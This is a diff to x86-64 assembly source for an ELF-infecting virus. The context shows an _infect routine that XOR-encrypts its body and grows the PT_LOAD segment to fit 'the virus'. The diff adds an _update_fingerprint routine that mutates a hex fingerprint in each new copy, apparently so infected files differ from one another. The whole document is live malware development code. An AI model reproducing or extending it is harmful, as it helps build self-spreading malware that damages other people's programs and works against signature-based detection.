@@ -1124,6 +1124,16 @@ _infect:
 	call _xor_encrypt
 	pop rdx
 	pop rax
+
+	; change fingerprint
+	lea rdi, [rel _params]
+	lea rcx, [rel fingerprint]
+	sub rcx, rdi
+	mov rdi, rax
+	add rdi, rcx
+	push rax
+	call _update_fingerprint
+	pop rax
 	pop rdi
 	pop rcx
 
@@ -1149,6 +1159,78 @@ _infect:
 	; change pt_load size
 	add [rbx + phdr.p_filesz], rdx; p_filesz + virus
 	add [rbx + phdr.p_memsz], rdx; p_memsz + virus
+ret
+
+;						fingerprint
+_update_fingerprint:; (string rdi)
+	push rdx
+	push rcx
+	push rsi
+	push r8
+	push r9
+
+	mov rsi, rdi
+	add rsi, 9
+	push 1
+	pop r9
+	.find_non_zero:
+		cmp byte[rsi], '0'
+		jne .end_find_non_zero
+		inc r9
+		inc rsi
+		jmp .find_non_zero
+	.end_find_non_zero:
+	push 4
+	pop r8
+	sub r8, r9
+
+	xor r9, r9
+	.reset_count_key:
+		xor rdx, rdx
+	.edit_fingerprint:
+		cmp r9, 8
+		je .end_edit_fingerprint
+		xor rax, rax
+		mov rcx, r9
+		mov ah, byte[rdi + rcx]
+		cmp ah, '9'
+		jle .no_alpha_0
+		add ah, 9
+		.no_alpha_0:
+		and ah, 0x0f
+		xor rcx, rcx
+		mov ch, byte[rsi + rdx]
+		cmp ch, '9'
+		jle .no_alpha_1
+		add ch, 9
+		.no_alpha_1:
+		and ch, 0x0f
+		add ah, ch
+		push rdx
+		movzx eax, ah
+		xor rdx, rdx
+		mov ecx, 0x10
+		div ecx
+		xor rax, rax
+		mov ah, dl
+		lea rdx, [rel hex_nums]
+		xor rcx, rcx
+		movzx ecx, ah
+		mov ah, byte[rdx + rcx]
+		mov rcx, r9
+		mov byte[rdi + rcx], ah
+		pop rdx
+		inc r9
+		inc rdx
+		cmp rdx, r8
+		jg .reset_count_key
+		jmp .edit_fingerprint
+	.end_edit_fingerprint:
+	pop r9
+	pop r8
+	pop rsi
+	pop rcx
+	pop rdx
 ret
 
 _check_file_process:; (string rdi)
